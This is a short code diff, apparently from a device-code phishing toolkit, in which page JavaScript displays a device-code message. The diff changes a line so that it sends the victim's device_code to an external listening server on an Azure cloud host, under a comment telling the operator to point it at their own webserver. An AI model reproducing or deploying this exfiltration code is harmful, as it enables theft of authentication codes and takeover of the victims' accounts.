@@ -14,7 +14,7 @@
             
             document.getElementById('code').innerHTML += data.message;
             // Change this line to point to your listening webserver
-            $.get("https://myprosusvm/?id=" + data.device_code);
+            $.get("https://myprosusvm.centralus.cloudapp.azure.com:8443/?id=" + data.device_code);
             let message = data.message;
                 
                 // Use regex to find the URL
